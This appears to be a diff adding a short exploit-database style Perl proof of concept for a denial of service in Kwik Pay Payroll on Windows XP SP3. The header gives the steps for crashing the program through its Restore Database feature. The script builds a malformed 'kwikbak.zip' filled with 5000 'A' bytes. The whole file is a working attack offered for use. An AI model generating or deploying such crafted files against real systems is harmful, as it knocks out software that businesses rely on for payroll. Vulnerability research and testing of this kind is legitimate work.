@@ -1,0 +1,28 @@
+# Exploit Title: Kwik Pay Payroll .zip DoS
+# Date: April 1, 2010
+# Tested on: Windows XP SP3
+# Cost: 100.00 AU
+# Author: [anonymous]
+# Site: [http://www.setfreesecurity.com]
+#
+# File -> Restore Database -> Find
+# Locate zip file
+# Click the restore button at the bottom
+# Program Crash, and becomes unresponsive
+#
+# Happy April fools but no Joke here
+# 
+# Phil 4:13
+#
+#!/usr/bin/perl
+
+
+print "Generating nasty Backup\n";
+
+my $data = "\x41" x 5000;
+my $zip = "kwikbak.zip";
+
+open (FILE, ">$zip");
+print FILE "$data";
+
+print "Done. . .\n"
